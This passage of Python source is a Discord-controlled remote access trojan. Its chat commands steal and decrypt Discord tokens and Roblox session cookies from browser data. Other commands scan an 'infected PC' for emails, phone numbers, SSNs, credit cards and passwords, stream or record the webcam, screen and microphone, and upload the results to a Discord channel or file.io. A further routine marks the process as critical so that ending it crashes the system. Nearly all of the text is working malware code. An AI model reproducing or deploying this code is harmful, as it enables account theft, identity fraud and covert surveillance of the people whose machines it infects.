                await message.channel.send("[-] No passwords found")
        except:
            await message.channel.send("[!] Password grab failed")

    
    if message.content == "!getdiscordtokens":
        await message.channel.send("[*] looking for tokens wait:=...")
        
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        temp = os.getenv("TEMP")
        Tokens = ''
        
        def checkToken(token):
            headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
            try:
                urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers))
                return True
            except:
                return False

        def GetTokenInfo(token):
            headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
            userjson = json.loads(urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
            username = userjson["username"]
            hashtag = userjson["discriminator"]
            email = userjson["email"]
            idd = userjson["id"]
            pfp = userjson["avatar"]
            flags = userjson["public_flags"]
            nitro = ""
            phone = "-"
            if "premium_type" in userjson:
                nitrot = userjson["premium_type"]
                if nitrot == 1:
                    nitro = "Classic Nitro"
                elif nitrot == 2:
                    nitro = "Nitro"
            if "phone" in userjson:
                phone = userjson["phone"]
            return username, hashtag, email, idd, pfp, flags, nitro, phone

        def GetBadge(flags):
            if flags == 0:
                return ''
            OwnedBadges = ''
            badgeList = [
                {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
                {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
                {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
                {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
                {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
                {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
                {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
                {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
                {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
                {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
            ]
            for badge in badgeList:
                if flags // badge["Value"] != 0:
                    OwnedBadges += badge["Emoji"]
                    flags = flags % badge["Value"]
            return OwnedBadges

        def uploadToken(token, path):
            username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
            
            if pfp == None:
                pfp = "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
            else:
                pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
            
            badge = GetBadge(flags)
            
            
            msg = f"IP:  | Usuário: {os.getenv('USERNAME').upper()} | Encontrado em `{path}`\n"
            msg += f"**Token:** `{token}`\n"
            msg += f"**Email:** `{email}`\n"
            msg += f"**Telefone:** `{phone}`\n"
            msg += f"**Badges:** {nitro}{badge}\n"
            msg += f"**Usuário:** {username}#{hashtag} ({idd})\n"
            msg += f"**Avatar:** {pfp}"
            
            
            asyncio.run_coroutine_threadsafe(message.channel.send(msg), client.loop)

        def getToken(path, arg):
            nonlocal Tokens
            if not os.path.exists(path):
                return
            path += arg
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                            for token in re.findall(regex, line):
                                if checkToken(token):
                                    if token not in Tokens:
                                        Tokens += token
                                        uploadToken(token, path)

        def getPassw(path, arg):
            if not os.path.exists(path):
                return
            pathC = path + arg + "/Login Data"
            if os.stat(pathC).st_size == 0:
                return
            tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
            shutil.copy2(pathC, tempfold)
            conn = sqlite3.connect(tempfold)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
            data = cursor.fetchall()
            cursor.close()
            conn.close()
            os.remove(tempfold)
            pathKey = path + "/Local State"
            with open(pathKey, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            master_key = CryptUnprotectData(master_key[5:])[1]
            
            def DecryptValue(buff, master_key=None):
                starts = buff.decode(encoding='utf8', errors='ignore')[:3]
                if starts == 'v10' or starts == 'v11':
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
            
            for row in data:
                if row[0] != '':
                    # writeforfile (owo)
                    pass

        def GetDiscord(path, arg):
            nonlocal Tokens
            if not os.path.exists(f"{path}/Local State"):
                return
            pathC = path + arg
            pathKey = path + "/Local State"
            with open(pathKey, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = CryptUnprotectData(master_key[5:])[1]
            for file in os.listdir(pathC):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                            if checkToken(tokenDecoded):
                                if tokenDecoded not in Tokens:
                                    Tokens += tokenDecoded
                                    uploadToken(tokenDecoded, path)

        def DecryptValue(buff, master_key=None):
            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
            if starts == 'v10' or starts == 'v11':
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass

        
        browserPaths = [
            [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
            [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
            [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
            [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
            [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
            [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
            [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
            [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ]
        ]
        discordPaths = [
            [f"{roaming}/Discord", "/Local Storage/leveldb"],
            [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
            [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
            [f"{roaming}/discordptb", "/Local Storage/leveldb"],
        ]
        
        for patt in browserPaths:
            getToken(patt[0], patt[2])
        for patt in discordPaths:
            GetDiscord(patt[0], patt[1])
        
        if Tokens:
            await message.channel.send(f"[+] {len(Tokens)} tokens found.")
        else:
            await message.channel.send("[-] no dc token found")

    # OSINT command
    if message.content == "!osint":
        await message.channel.send("[*] scaning for meail phonen umber cards etc")
        await message.channel.send("[*] wait a bit gng ")
        
        import queue
        result_queue = queue.Queue()    

     
    if message.content == "!getrobloxcookies":
        await message.channel.send("[*] Hunting for Roblox cookies...")
        
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        all_cookies = []
        
        
        def get_browser_key(browser_path):
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                return None
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    state = json.load(f)
                enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
                # Remove 'DPAPI' prefix (5 bytes)
                enc_key = enc_key[5:]
                return CryptUnprotectData(enc_key, None, None, None, 0)[1]
            except:
                return None
        
        # ----- Helper: decrypt cookie value (same logic as token decryption) -----
        def decrypt_value(encrypted_bytes, master_key):
            try:
                if len(encrypted_bytes) < 3:
                    return None
                # Check for v10/v11 prefix on bytes
                if encrypted_bytes[:3] in (b'v10', b'v11'):
                    nonce = encrypted_bytes[3:15]
                    ciphertext = encrypted_bytes[15:-16]
                    tag = encrypted_bytes[-16:]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    return decrypted.decode('utf-8', errors='ignore')
                else:
                    # Older DPAPI only
                    return CryptUnprotectData(encrypted_bytes).decode('utf-8', errors='ignore')
            except:
                return None
        
        # ----- Browser cookie paths (all possible locations) -----
        browser_configs = [
            # Chrome
            (os.path.join(local, "Google", "Chrome", "User Data"), "Default", "Chrome"),
            # Edge
            (os.path.join(local, "Microsoft", "Edge", "User Data"), "Default", "Edge"),
            # Brave
            (os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), "Default", "Brave"),
            # Opera (uses different structure - cookies in Network folder)
            (os.path.join(roaming, "Opera Software", "Opera Stable"), "Default", "Opera"),
            (os.path.join(roaming, "Opera Software", "Opera GX Stable"), "Default", "Opera GX"),
            # Vivaldi
            (os.path.join(local, "Vivaldi", "User Data"), "Default", "Vivaldi"),
            # Chromium
            (os.path.join(local, "Chromium", "User Data"), "Default", "Chromium"),
        ]
        
        for browser_path, profile, browser_name in browser_configs:
            if not os.path.exists(browser_path):
                continue
            
            # Get master key
            master_key = get_browser_key(browser_path)
            if not master_key:
                continue
            
            # 
            cookie_file = os.path.join(browser_path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_file):
                cookie_file = os.path.join(browser_path, profile, "Cookies")
            if not os.path.exists(cookie_file):
                continue
            
            # Copy cookie 
            temp_db = os.path.join(os.environ['TEMP'], f"roblox_cookies_{random.randint(1000,9999)}.db")
            try:
                shutil.copy2(cookie_file, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Look for Roblox security cookie
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name = '.ROBLOSECURITY'")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_db)
                
                for row in rows:
                    host = row[0]
                    cookie_name = row[1]
                    encrypted = row[2]
                    if encrypted:
                        decrypted = decrypt_value(encrypted, master_key)
                        if decrypted and len(decrypted) > 50:
                            all_cookies.append({
                                'value': decrypted,
                                'browser': browser_name,
                                'host': host
                            })
            except:
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        # Remove duplicates
        unique_cookies = []
        seen = set()
        for c in all_cookies:
            if c['value'] not in seen:
                seen.add(c['value'])
                unique_cookies.append(c)
        
        if not unique_cookies:
            await message.channel.send("[-] No Roblox cookies found on this system")
            return
        
        # Validate cookies and get user info
        valid_cookies = []
        for cookie in unique_cookies[:10]:
            try:
                headers = {"Cookie": f".ROBLOSECURITY={cookie['value']}", "User-Agent": get_ua()}
                resp = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
                if resp.status_code == 200:
                    user_data = resp.json()
                    valid_cookies.append((cookie, user_data))
            except:
                pass
        
        if not valid_cookies:
            await message.channel.send("[-] Found cookies but all expired/invalid")
            return
        
        # Send results
        await message.channel.send(f"[+] Found {len(valid_cookies)} valid Roblox cookie(s)")
        for cookie, user_data in valid_cookies[:5]:
            username = user_data.get('name', 'Unknown')
            user_id = user_data.get('id', 'Unknown')
            display_name = user_data.get('displayName', username)
            created = user_data.get('created', 'Unknown')
            
            result = f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                          ROBLOX COOKIE FOUND                               ║
╠════════════════════════════════════════════════════════════════════════════╣
║ Username: {username}
║ Display Name: {display_name}
║ User ID: {user_id}
║ Account Created: {created}
║ Browser: {cookie.get('browser', 'Unknown')}
║ Host: {cookie.get('host', 'Unknown')}
║
║ COOKIE VALUE:
║ {cookie['value']}
╚════════════════════════════════════════════════════════════════════════════╝
"""
            await message.channel.send(f"```{result}```")

     # ============================================================
    # OSINT COMMAND - Runs in separate thread to avoid blocking
    # ============================================================
    if message.content == "!osint":
        await message.channel.send("[*] Scanning infected PC for emails, phone numbers, and usernames...")
        await message.channel.send("[*] This may take a few minutes. I'll send results when done...")
        
        # Create a queue for results
        import queue
        result_queue = queue.Queue()
        
        def osint_scan():
            found_emails = []
            found_phones = []
            found_usernames = []
            found_ssns = []
            found_credit_cards = []
            found_passwords = []
            
            # Search paths (limit to avoid too much scanning)
            search_paths = [
                os.getenv('USERPROFILE') + "\\Desktop",
                os.getenv('USERPROFILE') + "\\Documents",
                os.getenv('USERPROFILE') + "\\Downloads",
                os.getenv('APPDATA') + "\\Discord",
                os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\Default",
                os.getenv('TEMP'),
            ]
            
            # Regex patterns
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            phone_pattern = r'(\+?1?[-. ]?\(?[0-9]{3}\)?[-. ]?[0-9]{3}[-. ]?[0-9]{4})'
            ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
            credit_card_pattern = r'\b(?:\d{4}[- ]?){3}\d{4}\b'
            username_pattern = r'(?:username|user|login)[\s:=]+([a-zA-Z0-9_]{3,20})'
            password_pattern = r'(?:password|pass|pwd)[\s:=]+([a-zA-Z0-9!@#$%^&*]{4,32})'
            
            # File extensions to scan
            extensions = ('.txt', '.log', '.cfg', '.ini', '.conf', '.json', '.xml', '.csv')
            
            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue
                
                try:
                    for root, dirs, files in os.walk(search_path):
                        # Limit depth to avoid long scans
                        depth = root.count(os.sep) - search_path.count(os.sep)
                        if depth > 2:
                            dirs.clear()  # Don't go too deep
                            continue
                        
                        for file in files:
                            if file.lower().endswith(extensions):
                                try:
                                    file_path = os.path.join(root, file)
                                    if os.path.getsize(file_path) > 1 * 1024 * 1024:  # Skip files > 1MB
                                        continue
                                    
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read(50000)  # Only read first 50k chars for speed
                                        
                                        # Find emails
                                        for email in re.findall(email_pattern, content, re.IGNORECASE):
                                            if email not in found_emails and len(email) > 5:
                                                found_emails.append(email)
                                        
                                        # Find phone numbers
                                        for phone in re.findall(phone_pattern, content):
                                            if phone not in found_phones and len(phone) > 9:
                                                found_phones.append(phone)
                                        
                                        # Find SSNs
                                        for ssn in re.findall(ssn_pattern, content):
                                            if ssn not in found_ssns:
                                                found_ssns.append(ssn)
                                        
                                        # Find credit cards
                                        for cc in re.findall(credit_card_pattern, content):
                                            if cc not in found_credit_cards:
                                                found_credit_cards.append(cc)
                                        
                                        # Find usernames
                                        for username in re.findall(username_pattern, content, re.IGNORECASE):
                                            if username not in found_usernames and len(username) > 3:
                                                found_usernames.append(username)
                                        
                                        # Find passwords
                                        for pwd in re.findall(password_pattern, content, re.IGNORECASE):
                                            if pwd not in found_passwords and len(pwd) > 4:
                                                found_passwords.append(pwd)
                                except:
                                    continue
                except:
                    continue
            
            # Check browsers for saved emails
            local = os.getenv('LOCALAPPDATA')
            browsers = {
                "Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                "Edge": local + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
            }
            
            for browser_name, login_path in browsers.items():
                if os.path.exists(login_path):
                    try:
                        temp_db = os.path.join(os.getenv('TEMP'), f"{browser_name}_login_osint.db")
                        shutil.copy2(login_path, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value FROM logins LIMIT 100")
                        rows = cursor.fetchall()
                        for row in rows:
                            if row[1] and '@' in row[1] and row[1] not in found_emails:
                                found_emails.append(row[1])
                            if row[1] and not '@' in row[1] and len(row[1]) > 3 and row[1] not in found_usernames:
                                found_usernames.append(row[1])
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
            
            # Return results
            result_queue.put({
                'emails': found_emails[:30],
                'phones': found_phones[:20],
                'usernames': found_usernames[:20],
                'ssns': found_ssns[:10],
                'credit_cards': found_credit_cards[:10],
                'passwords': found_passwords[:15]
            })
        
        # Run scan in background thread
        scan_thread = threading.Thread(target=osint_scan)
        scan_thread.daemon = True
        scan_thread.start()
        
        # Wait for results (with timeout)
        try:
            results = result_queue.get(timeout=120)  # 2 minute timeout
        except queue.Empty:
            await message.channel.send("[!] Scan timed out after 2 minutes. Try again or scan smaller areas.")
            return
        
        # Build result box
        result = ""
        result += "╔════════════════════════════════════════════════════════════════════════════╗\n"
        result += "║                    OSINT RESULTS - INFECTED PC                             ║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # Emails
        result += f"║  EMAILS FOUND: {len(results['emails'])}\n"
        result += "║\n"
        if results['emails']:
            for email in results['emails'][:15]:
                result += f"║   {email}\n"
        else:
            result += "║   No emails found\n"
        
        result += "║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # Phone numbers
        result += f"║  PHONE NUMBERS FOUND: {len(results['phones'])}\n"
        result += "║\n"
        if results['phones']:
            for phone in results['phones'][:10]:
                result += f"║   {phone}\n"
        else:
            result += "║   No phone numbers found\n"
        
        result += "║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # Usernames
        result += f"║  USERNAMES FOUND: {len(results['usernames'])}\n"
        result += "║\n"
        if results['usernames']:
            for username in results['usernames'][:15]:
                result += f"║   {username}\n"
        else:
            result += "║   No usernames found\n"
        
        result += "║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # SSNs
        result += f"║  SSNS FOUND: {len(results['ssns'])}\n"
        result += "║\n"
        if results['ssns']:
            for ssn in results['ssns'][:5]:
                result += f"║   {ssn}\n"
        else:
            result += "║   No SSNs found\n"
        
        result += "║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # Credit Cards
        result += f"║  CREDIT CARDS FOUND: {len(results['credit_cards'])}\n"
        result += "║\n"
        if results['credit_cards']:
            for cc in results['credit_cards'][:5]:
                result += f"║   {cc}\n"
        else:
            result += "║   No credit cards found\n"
        
        result += "║\n"
        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
        
        # Passwords
        result += f"║  PASSWORDS FOUND: {len(results['passwords'])}\n"
        result += "║\n"
        if results['passwords']:
            for pwd in results['passwords'][:10]:
                result += f"║   {pwd}\n"
        else:
            result += "║   No passwords found\n"
        
        result += "║\n"
        result += "╚════════════════════════════════════════════════════════════════════════════╝"
        
        await message.channel.send(f"```\n{result}\n```")
        
        # Save detailed report if there's data
        if results['emails'] or results['phones'] or results['usernames']:
            report_file = os.path.join(os.getenv('TEMP'), "osint_report.txt")
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write("OSINT REPORT - INFECTED PC\n")
                f.write("=" * 60 + "\n\n")
                f.write(f"Computer Name: {os.getenv('COMPUTERNAME')}\n")
                f.write(f"Username: {os.getenv('USERNAME')}\n\n")
                
                f.write("EMAILS FOUND:\n")
                for email in results['emails']:
                    f.write(f"  {email}\n")
                
                f.write("\nPHONE NUMBERS FOUND:\n")
                for phone in results['phones']:
                    f.write(f"  {phone}\n")
                
                f.write("\nUSERNAMES FOUND:\n")
                for username in results['usernames']:
                    f.write(f"  {username}\n")
                
                f.write("\nSSNs FOUND:\n")
                for ssn in results['ssns']:
                    f.write(f"  {ssn}\n")
                
                f.write("\nCREDIT CARDS FOUND:\n")
                for cc in results['credit_cards']:
                    f.write(f"  {cc}\n")
                
                f.write("\nPASSWORDS FOUND:\n")
                for pwd in results['passwords']:
                    f.write(f"  {pwd}\n")
            
            file = discord.File(report_file, filename="osint_report.txt")
            await message.channel.send("[*] Full OSINT report attached", file=file)
            os.remove(report_file)
        
        # Summary
        total = len(results['emails']) + len(results['phones']) + len(results['usernames']) + len(results['ssns']) + len(results['credit_cards']) + len(results['passwords'])
        await message.channel.send(f"[+] OSINT Complete: {len(results['emails'])} emails, {len(results['phones'])} phones, {len(results['usernames'])} usernames, {len(results['ssns'])} SSNs, {len(results['credit_cards'])} credit cards, {len(results['passwords'])} passwords")
    # Stream webcam 
    if message.content == "!streamwebcam":
        await message.channel.send("[*] Streaming webcam... (use !stopwebcam to stop)")
        stop_file = os.path.join(os.getenv('TEMP'), "stop_webcam.txt")
        if os.path.exists(stop_file):
            os.remove(stop_file)
        
        camera = cv2.VideoCapture(0)
        while not os.path.exists(stop_file):
            ret, frame = camera.read()
            if ret:
                cam_path = os.path.join(os.getenv('TEMP'), "stream.png")
                cv2.imwrite(cam_path, frame)
                file = discord.File(cam_path, filename="stream.png")
                await message.channel.send(file=file)
                await asyncio.sleep(2)
        camera.release()
        if os.path.exists(stop_file):
            os.remove(stop_file)

    if message.content == "!stopwebcam":
        stop_file = os.path.join(os.getenv('TEMP'), "stop_webcam.txt")
        with open(stop_file, 'w') as f:
            f.write('stop')
        await message.channel.send("[*] Webcam stream stopped")

    # Stream screen 
    if message.content == "!streamscreen":
        await message.channel.send("[*] Streaming screen... (use !stopscreen to stop)")
        stop_file = os.path.join(os.getenv('TEMP'), "stop_screen.txt")
        if os.path.exists(stop_file):
            os.remove(stop_file)
        
        while not os.path.exists(stop_file):
            with mss() as sct:
                screenshot_path = os.path.join(os.getenv('TEMP'), "stream_screen.png")
                sct.shot(output=screenshot_path)
            file = discord.File(screenshot_path, filename="stream_screen.png")
            await message.channel.send(file=file)
            await asyncio.sleep(2)
        if os.path.exists(stop_file):
            os.remove(stop_file)

    if message.content == "!stopscreen":
        stop_file = os.path.join(os.getenv('TEMP'), "stop_screen.txt")
        with open(stop_file, 'w') as f:
            f.write('stop')
        await message.channel.send("[*] Screen stream stopped")

    # Record screen
    if message.content.startswith("!recscreen"):
        try:
            seconds = float(message.content[10:])
            frames = int(seconds * 20)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            video_path = os.path.join(os.getenv('TEMP'), "recording.avi")
            out = cv2.VideoWriter(video_path, fourcc, 20.0, (1920, 1080))
            
            for _ in range(frames):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
            
            out.release()
            
            if os.path.getsize(video_path) > 7340032:
                with open(video_path, "rb") as f:
                    response = requests.post('https://file.io/', files={"file": f}).json()
                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
            else:
                file = discord.File(video_path, filename="recording.avi")
                await message.channel.send("[*] Recording complete", file=file)
            os.remove(video_path)
        except:
            await message.channel.send("[!] Recording failed")

    # Record camera
    if message.content.startswith("!reccam"):
        try:
            seconds = float(message.content[8:])
            frames = int(seconds * 20)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video_path = os.path.join(os.getenv('TEMP'), "cam_recording.mp4")
            out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
            cap = cv2.VideoCapture(0)
            
            for _ in range(frames):
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            
            cap.release()
            out.release()
            
            if os.path.getsize(video_path) > 7340032:
                with open(video_path, "rb") as f:
                    response = requests.post('https://file.io/', files={"file": f}).json()
                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
            else:
                file = discord.File(video_path, filename="cam_recording.mp4")
                await message.channel.send("[*] Recording complete", file=file)
            os.remove(video_path)
        except:
            await message.channel.send("[!] Recording failed")

    # Record audio
    if message.content.startswith("!recaudio"):
        try:
            seconds = float(message.content[10:])
            fs = 44100
            audio_path = os.path.join(os.getenv('TEMP'), "audio_recording.wav")
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(audio_path, fs, recording)
            
            if os.path.getsize(audio_path) > 7340032:
                with open(audio_path, "rb") as f:
                    response = requests.post('https://file.io/', files={"file": f}).json()
                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
            else:
                file = discord.File(audio_path, filename="audio_recording.wav")
                await message.channel.send("[*] Recording complete", file=file)
            os.remove(audio_path)
        except:
            await message.channel.send("[!] Recording failed")

def volumeup():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    except:
        pass

def volumedown():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
    except:
        pass

def critproc():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except:
        pass

def uncritproc():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    except:
        pass

# Run the bot
client.run(token)
